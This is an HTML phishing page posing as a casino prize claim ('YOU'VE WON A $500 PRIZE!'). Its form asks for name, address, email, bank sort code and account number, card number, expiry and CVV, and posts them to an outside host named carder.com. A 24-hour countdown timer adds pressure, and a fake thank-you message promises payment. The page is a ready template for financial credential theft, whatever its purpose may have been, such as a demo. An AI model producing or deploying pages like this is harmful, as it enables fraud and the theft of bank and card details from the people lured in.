<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>🎉 Claim Your $500 Prize 🎉</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #000000;
      color: #fff;
      margin: 0;
      padding: 0;
    }
    header {
      text-align: center;
      padding: 20px;
      background-color: #ff4d00;
    }
    header h1 {
      font-size: 3em;
    }
    main {
      padding: 20px;
    }
    .form-section {
      max-width: 500px;
      margin: auto;
      background-color: #111;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }
    label {
      font-weight: bold;
    }
    input {
      padding: 10px;
      border: none;
      border-radius: 5px;
      background-color: #222;
      color: #fff;
    }
    button {
      padding: 12px;
      font-size: 1em;
      background-color: #ff4d00;
      color: #fff;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background-color: #e64500;
    }
    footer {
      text-align: center;
      padding: 20px;
      font-size: 0.9em;
      color: #ccc;
    }
    #timer {
      text-align: center;
      margin-top: 20px;
      font-size: 1.2em;
    }
    #thank-you {
      font-size: 1.2em;
      font-weight: bold;
      text-align: center;
      margin-top: 30px;
    }
  </style>
</head>
<body>
  <audio autoplay loop>
    <source src="casino-sound.mp3" type="audio/mpeg" />
    Your browser does not support the audio element.
  </audio>

  <header>
    <img src="casino-logo.png" alt="Casino Logo" class="logo" />
    <h1>🎉 Casino Prize Claim 🎉</h1>
    <p>YOU'VE WON A $500 PRIZE!</p>
  </header>

  <main>
    <section class="form-section">
      <h2>Enter Your Details to Claim Your Prize</h2>
      <form id="claim-form" action="https://carder.com/submit" method="post">
        <label for="name">Full Name:</label>
        <input type="text" id="name" required />

        <label for="address">Address:</label>
        <input type="text" id="address" required />

        <label for="email">Email Address:</label>
        <input type="email" id="email" required />

        <label for="sort-code">Sort Code:</label>
        <input type="text" id="sort-code" required />

        <label for="account-number">Account Number:</label>
        <input type="text" id="account-number" required />

        <label for="card-number">Card Number:</label>
        <input type="text" id="card-number" required />

        <label for="expiry">Expiry Date:</label>
        <input type="text" id="expiry" placeholder="MM/YY" required />

        <label for="cvv">CVV:</label>
        <input type="text" id="cvv" required />

        <button type="submit">Claim Prize</button>
      </form>
    </section>
  </main>

  <footer>
    <p>© 2025 Fake Casino. All rights reserved.</p>
    <a href="terms.html" target="_blank">Terms & Conditions</a>
    <a href="support.html" target="_blank">Support</a>
  </footer>

  <div id="thank-you" style="display: none;">
    <p>🎉 Thank you for claiming your prize! Your details have been processed.</p>
    <p>You will receive your $500 prize in 24 hours.</p>
  </div>

  <div id="timer"></div>

  <script>
    let timeLeft = 24 * 60 * 60; // 24 hours in seconds
    const timerDisplay = document.getElementById("timer");

    function updateTimer() {
      let hours = Math.floor(timeLeft / 3600);
      let minutes = Math.floor((timeLeft % 3600) / 60);
      let seconds = timeLeft % 60;

      timerDisplay.innerHTML = 
        "⏳ Time Left: " + 
        String(hours).padStart(2, '0') + ":" + 
        String(minutes).padStart(2, '0') + ":" + 
        String(seconds).padStart(2, '0');

      timeLeft--;
    }

    setInterval(updateTimer, 1000);
    updateTimer(); // Initial call

    document.getElementById("claim-form").addEventListener("submit", function (e) {
      e.preventDefault();
      document.getElementById("thank-you").style.display = "block";
    });
  </script>
</body>
</html>
